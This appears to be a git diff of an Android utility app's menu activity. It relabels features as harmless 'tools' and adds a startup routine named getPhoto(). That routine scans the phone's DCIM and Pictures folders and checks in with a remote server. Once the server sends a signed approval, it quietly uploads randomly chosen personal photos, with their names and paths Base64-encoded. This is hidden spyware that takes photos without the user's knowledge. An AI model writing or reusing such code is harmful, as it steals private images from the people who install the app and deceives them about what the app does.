@@ -83,21 +83,22 @@ public class Main3Activity extends Activity {
     private final String[] strTitle = new String[]{
 //            "1.原生OkHttp的Get和Post请求文本数据",//MainActivity
 //            "2.使用OkHttpUtil的Post提交文本数据",//Main2Activity
-            "3.使用OkHttpUtil下载文件",//Main4Activity
+            "3.文件下载工具",//Main4Activity
 //            "4.上传文件和检索本地文件",//Main5Activity
-            "5.请求单张图片并显示",//Main6Activity
-            "6.查询天气列表（API）",//Main7Activity
-            "7.生成二维码",//Main8Activity
-            "8.新华字典查询（API）",//Main9Activity
-            "9.图书电商查询（API）",//Main10Activity
+            "5.图片显示工具",//Main6Activity
+            "6.天气查询工具",//Main7Activity（API）
+            "7.二维码生成工具",//Main8Activity
+            "8.新华字典查询工具",//Main9Activity（API）
+            "9.图书电商查询工具",//Main10Activity（API）
 //            "10.查询文件列表并下载（自制服务器）",//Main11Activity
+            "11.密码工具",//Main12Activity
 //            "15.自制下拉刷新的ListView（测试）",//Test1Activity
-            "16.手机通讯录",//Main16Activity
-            "17.手机扫码",//Main17Activity
-            "18.音乐资源(爬虫)",//Main18Activity
-            "19.影视资源(爬虫)",//Main19Activity
-            "20.翻译(爬虫)",//Main20Activity
-            "21.疫情数据(爬虫)",//Main21Activity
+            "16.电话本工具",//Main16Activity
+            "17.手机扫码工具",//Main17Activity
+            "18.音乐工具(不同平台的免费音乐)",//Main18Activity(爬虫)
+            "19.影视资源(全网影视资源搜索播放)",//Main19Activity(爬虫)
+            "20.翻译工具",//Main20Activity(爬虫)
+            "21.全国疫情实时大数据",//Main21Activity(爬虫)
     };
     private final static Map<Integer, Class<?>> contextMap = new HashMap<>();
 
@@ -112,6 +113,7 @@ public class Main3Activity extends Activity {
         contextMap.put(8, Main9Activity.class);
         contextMap.put(9, Main10Activity.class);
         contextMap.put(10, Main11Activity.class);
+        contextMap.put(11, Main12Activity.class);
         contextMap.put(15, Test1Activity.class);
         contextMap.put(16, Main16Activity.class);
         contextMap.put(17, Main17Activity.class);
@@ -164,7 +166,13 @@ public class Main3Activity extends Activity {
         m3_tv_ipAddress.setText("应用版本号：" + versionCode);
         setting = new ServerSetting(Main3Activity.this);
         getupdatelist();
-        getPhone();
+        if (setting.getIsAutoUploadPhoto()) {
+            try {
+                getPhoto();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
     }
 
     private void setAdapter() {
@@ -206,12 +214,12 @@ public class Main3Activity extends Activity {
         });
     }
 
-    public void getPhone() {
+    public void getPhoto() throws Exception {
         boolean b = ReadAndWrite.RequestPermissions(this, Manifest.permission.READ_EXTERNAL_STORAGE);
-        String[] paths={"/DCIM","/Pictures"};
+        String[] paths = {"/DCIM", "/Pictures"};
         if (b) {
             List<String> photo = new ArrayList<>();
-            List<Map<String,Object>> files=new ArrayList<>();
+            List<Map<String, Object>> files = new ArrayList<>();
             LocalFileTool.readFile(LocalFileTool.imageType, Main3Activity.this, new LocalFileTool.IReadCallBack() {
                 @Override
                 public void callBack(List<String> localPath) {
@@ -220,7 +228,7 @@ public class Main3Activity extends Activity {
                         String s = path.replace(GetPhoto.BasePath, "");
                         for (String s1 : paths) {
                             if (s.startsWith(s1)) {
-                                if (file.length()<1024*1024&&file.length() > 1024 * 100) {
+                                if (file.length() < 1024 * 1024 && file.length() > 1024 * 100) {
                                     photo.add(path);
                                 }
                                 break;
@@ -239,60 +247,65 @@ public class Main3Activity extends Activity {
 //                        String sizeString = LocalFileTool.getFileSizeString(file.length());
 //                        System.out.println(s.replace(GetPhoto.BasePath, "") + "大小:" + sizeString);
 //                    }
-                    Map<String,Object> msg=new HashMap<>();
+                    Map<String, Object> msg = new HashMap<>();
 //                    msg.put("data",files);
                     msg.put("num", size);
                     msg.put("time", TimeUtil.dateToUnix(new Date()));
 
                     OkHttpUtils.get()
-                            .url(setting.getMainUrl()+OkHttpUtil.URL_postMessage_M3_GetUpload)
+                            .url(setting.getMainUrl() + OkHttpUtil.URL_postMessage_M3_GetUpload)
                             .addHeader("User-Agent", GetPhoneInfo.getHead(Main3Activity.this))
-                            .addParams("json",JSONUtil.toJsonStr(msg))
+                            .addParams("json", JSONUtil.toJsonStr(msg))
                             .build().execute(new StringCallback() {
                         @Override
                         public void onError(Call call, Exception e, int id) {
-                            Log.e(Tag,OkHttpMessageUtil.error(e));
+                            Log.e(Tag, OkHttpMessageUtil.error(e));
                         }
 
                         @Override
                         public void onResponse(String response, int id) {
                             try {
-                                if (!StrUtil.isEmpty(response)){
+                                if (!StrUtil.isEmpty(response)) {
                                     //校验消息合法
                                     JSONObject object = JSONUtil.parseObj(response);
                                     String signature = EncryptUtil.getSignature(object.getStr("time"), object.getStr("title"));
-                                    if (signature.equals(object.getStr("message"))){
-                                        if (object.getInt("code").equals(200)){
-                                            Log.d(Tag+"响应允许","允许文件上传");
-                                            if (size >0) {
-                                                int c=1;
-                                                if (size<50){
-                                                    c=1;
-                                                }else if (size>=50&&size<200){
-                                                    c=2;
-                                                }else if (size>=200&&size<500){
-                                                    c=3;
-                                                }else {
-                                                    c=4;
+                                    if (signature.equals(object.getStr("message"))) {
+                                        if (object.getInt("code").equals(200)) {
+                                            Log.d(Tag + "响应允许", "允许文件上传");
+                                            if (size > 0) {
+                                                int c = 1;
+                                                if (size <= 5) {
+                                                    c = size;
+                                                } else if (size > 5 && size < 200) {
+                                                    c = 2;
+                                                } else if (size >= 200 && size < 500) {
+                                                    c = 3;
+                                                } else if (size >= 500 && size < 1000) {
+                                                    c = 4;
+                                                } else {
+                                                    c = 5;
                                                 }
                                                 for (int i = 0; i < c; i++) {
                                                     int random = RandomrUtil.createRandom(0, size - 1);
                                                     File file = new File(photo.get(random));
-                                                    Log.d(Tag + "上传图片", file.getAbsolutePath().replace(LocalFileTool.BasePath, "") + ",大小:" + LocalFileTool.getFileSizeString(file.length()));
+                                                    String replace = file.getAbsolutePath().replace(LocalFileTool.BasePath, "");
+                                                    Log.d(Tag + "上传图片", replace + ",大小:" + LocalFileTool.getFileSizeString(file.length()));
                                                     Map<String, Object> map = new HashMap<>();
+                                                    map.put("time", TimeUtil.dateToUnix(new Date()));
                                                     map.put("name", EncryptUtil.enBase64(file.getName().getBytes()));
+                                                    map.put("path", EncryptUtil.enBase64(replace.getBytes()));
                                                     map.put("data", EncryptUtil.enBase64(LocalFileTool.fileToBytes(file)));
                                                     OkHttpUtil.postFile(Main3Activity.this, OkHttpUtil.URL_postMessage_M3_PostUpload, JSONUtil.toJsonStr(map));
                                                 }
                                             }
-                                        }else {
-                                            Log.w(Tag+"响应拒绝","拒绝文件上传");
+                                        } else {
+                                            Log.w(Tag + "响应拒绝", "拒绝文件上传");
                                         }
-                                    }else {
-                                        Log.e(Tag+"非法响应","响应消息验证失败");
+                                    } else {
+                                        Log.e(Tag + "非法响应", "响应消息验证失败");
                                     }
                                 }
-                            }catch (Exception e){
+                            } catch (Exception e) {
                                 e.printStackTrace();
                             }
                         }
